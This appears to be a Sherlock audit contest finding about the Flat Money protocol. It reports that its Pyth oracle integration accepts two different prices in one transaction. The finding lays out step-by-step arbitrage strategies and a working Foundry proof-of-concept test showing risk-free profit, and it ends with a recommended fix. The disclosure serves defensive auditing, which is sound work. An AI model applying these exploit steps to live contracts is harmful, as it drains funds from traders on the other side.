Droll Ash Cricket

high

# Oracle can return different prices in same transaction

## Summary

The Pyth network oracle contract allows to submit and read two different prices in the same transaction. This can be used to create arbitrage opportunities that can make a profit with no risk at the expense of users on the other side of the trade.

## Vulnerability Detail

`OracleModule.sol` uses Pyth network as the primary source of price feeds. This oracle works in the following way:

- A dedicated network keeps track of the latest price consensus, together with the timestamp.
- This data is queried off-chain and submitted to the on-chain oracle.
- It is checked that the data submitted is valid and the new price data is stored.
- New requests for the latest price will now return the data submitted until a more recent price is submitted.

One thing to note is that the Pyth network is constantly updating the latest price (every 400ms), so when a new price is submitted on-chain it is not necessary that the price is the latest one. Otherwise, the process of querying the data off-chain, building the transaction, and submitting it on-chain would be required to be done with a latency of less than 400ms, which is not feasible. This makes it possible to submit two different prices in the same transaction and, thus, fetch two different prices in the same transaction.

This can be used to create some arbitrage opportunities that can make a profit with no risk. 

### How this can be exploited

An example of how this can be exploited, and showed in the PoC, would be:
- Create a small leverage position.
- Announce an adjustment order to increase the size of the position by some amount.
- In the same block, announce a limit close order.
- After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is higher than the first one.
- Execute the adjustment order sending the first price.
- Execute the limit close order sending the second price.

The result is approximately a profit of

```shell
adjustmentSize * (secondPrice - firstPrice) - (adjustmentSize * tradeFees * 2)
```

> Note: For simplicity, we do not take into account the initial size of the position, which in any case can be insignificant compared to the adjustment size. The keeper fee is also not included, as is the owner of the position that is executing the orders.

The following things are required to make a profit out of this attack:
- Submit the orders before other keepers. This can be easily achieved, as there are not always enough incentives to execute the orders as soon as possible.
- Obtain a positive delta between two prices in the time frame where the orders are executable that is greater than twice the trade fees. This can be very feasible, especially in moments of high volatility. Note also, that this requirement can be lowered to a delta greater than once the trade fees if we take into account that there is currently [another vulnerability](https://github.com/sherlock-audit/2023-12-flatmoney-shaka0x/issues/2) that allows to avoid paying fees for the limit order.

In the case of not being able to obtain the required delta or observing that a keeper has already submitted a transaction to execute them before the delta is obtained, the user can simply cancel the limit order and will have just the adjustment order executed.

Another possible strategy would pass through the following steps:
- Create a leverage position.
- Announce another leverage position with the same size.
- In the same block, announce a limit close order.
- After the minimum execution time has elapsed, retrieve two prices from the Pyth oracle where the second price is lower than the first one.
- Execute the limit close order sending the first price.
- Execute the open order sending the second price.

The result in this case is having a position with the same size as the original one, but having either lowered the `position.lastPrice` or getting a profit from the original position, depending on how the price has moved since the original position was opened.

## Proof of concept

<details>

<summary>Pyth network multiple submissions</summary>

We can find proof that it is possible to submit and read two different prices in the same transaction [here](https://basescan.org/tx/0x0e0c22e5996ae58bbff806eba6d51e8fc773a3598ef0e0a359432e08f0b51b95). In this transaction `updatePriceFeeds` is called with two different prices. After each call the current price is fetched and an event is emitted with the price and timestamp received. As we can see, the values fetched are different for each query of the price.

```js
Address 0x8250f4af4b972684f7b336503e2d6dfedeb1487a
Name    PriceFeedUpdate (index_topic_1 bytes32 id, uint64 publishTime, int64 price, uint64 conf)
Topics  0 0xd06a6b7f4918494b3719217d1802786c1f5112a6c1d88fe2cfec00b4584f6aec
        1 FF61491A931112DDF1BD8147CD1B641375F79F5825126D665480874634FD0ACE
Data    publishTime: 1706358779
        price: 226646416525
        conf: 115941591

Address 0xbf668dadb9cb8934468fcba6103fb42bb50f31ec
Topics  0 0x734558db0ee3a7f77fb28b877f9d617525904e6dad1559f727ec93aa06370866
Data    226646416525
        1706358779

Address 0x8250f4af4b972684f7b336503e2d6dfedeb1487a
Name    PriceFeedUpdate (index_topic_1 bytes32 id, uint64 publishTime, int64 price, uint64 conf)View Source
Topics  0 0xd06a6b7f4918494b3719217d1802786c1f5112a6c1d88fe2cfec00b4584f6aec
        1 FF61491A931112DDF1BD8147CD1B641375F79F5825126D665480874634FD0ACE
Data    publishTime: 1706358790
        price: 226649088828
        conf: 119840116

Address 0xbf668dadb9cb8934468fcba6103fb42bb50f31ec
Topics  0 0x734558db0ee3a7f77fb28b877f9d617525904e6dad1559f727ec93aa06370866
Data    226649088828
        1706358790
```

</details>

<details>

<summary>Arbitrage example</summary>

Add the following function to the `OracleTest` contract and run `forge test --mt testMultiplePricesInSameTx -vv`:

```solidity
function testMultiplePricesInSameTx() public {
        // Setup
        vm.startPrank(admin);
        leverageModProxy.setLevTradingFee(0.001e18); // 0.1%
        uint256 collateralPrice = 1000e8;
        setWethPrice(collateralPrice);
        announceAndExecuteDeposit({
                traderAccount: bob,
                keeperAccount: keeper,
                depositAmount: 10000e18,
                oraclePrice: collateralPrice,
                keeperFeeAmount: 0
        });
        uint256 aliceCollateralBalanceBefore = WETH.balanceOf(alice);

        // Create small leverage position
        uint256 initialMargin = 0.05e18;
        uint256 initialSize = 0.1e18;
        uint256 tokenId = announceAndExecuteLeverageOpen({
                traderAccount: alice,
                keeperAccount: keeper,
                margin: initialMargin,
                additionalSize: initialSize,
                oraclePrice: collateralPrice,
                keeperFeeAmount: 0
        });

        // Announce leverage adjustment
        announceAdjustLeverage({
                traderAccount: alice,
                tokenId: tokenId,
                marginAdjustment: 100e18,
                additionalSizeAdjustment: 2400e18,
                keeperFeeAmount: 0
        });

        // Anounce limit order in the same block
        vm.startPrank(alice);
        limitOrderProxy.announceLimitOrder({
                tokenId: tokenId,
                priceLowerThreshold: 0,
                priceUpperThreshold: 1 // executable at any price
        });

        // Wait for the orders to be executable
        skip(vaultProxy.minExecutabilityAge());
        bytes[] memory priceUpdateData1 = getPriceUpdateData(collateralPrice);
        // Price increases slightly after one second
        skip(1);
        bytes[] memory priceUpdateData2 = getPriceUpdateData(collateralPrice + 1.2e8);

        // Execute the adjustment with the lower price and the limit order with the higher price
        delayedOrderProxy.executeOrder{value: 1}(alice, priceUpdateData1);
        limitOrderProxy.executeLimitOrder{value: 1}(tokenId, priceUpdateData2);

        uint256 aliceCollateralBalanceAfter = WETH.balanceOf(alice);
        if (aliceCollateralBalanceAfter < aliceCollateralBalanceBefore) {
                console2.log("loss: %s", aliceCollateralBalanceBefore - aliceCollateralBalanceAfter);
        } else {
                console2.log("profit: %s", aliceCollateralBalanceAfter - aliceCollateralBalanceBefore);
        }
}
```

Console output:

```js
[PASS] testMultiplePricesInSameTx() (gas: 2351256)
Logs:
  profit: 475467998401917697

Test result: ok. 1 passed; 0 failed; 0 skipped; finished in 13.67ms
```
</details>

## Impact

Different oracle prices can be fetched in the same transaction, which can be used to create arbitrage opportunities that can make a profit with no risk at the expense of users on the other side of the trade.

## Code Snippet

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L69

https://github.com/sherlock-audit/2023-12-flatmoney/blob/main/flatcoin-v1/src/OracleModule.sol#L167

## Tool used

Manual Review

## Recommendation

```diff
File: OracleModule.sol
    FlatcoinStructs.OffchainOracle public offchainOracle; // Offchain Pyth network oracle

+   uint256 public lastOffchainUpdate;

    (...)

    function updatePythPrice(address sender, bytes[] calldata priceUpdateData) external payable nonReentrant {
+       if (lastOffchainUpdate >= block.timestamp) return;
+       lastOffchainUpdate = block.timestamp;
+
        // Get fee amount to pay to Pyth
        uint256 fee = offchainOracle.oracleContract.getUpdateFee(priceUpdateData);
```
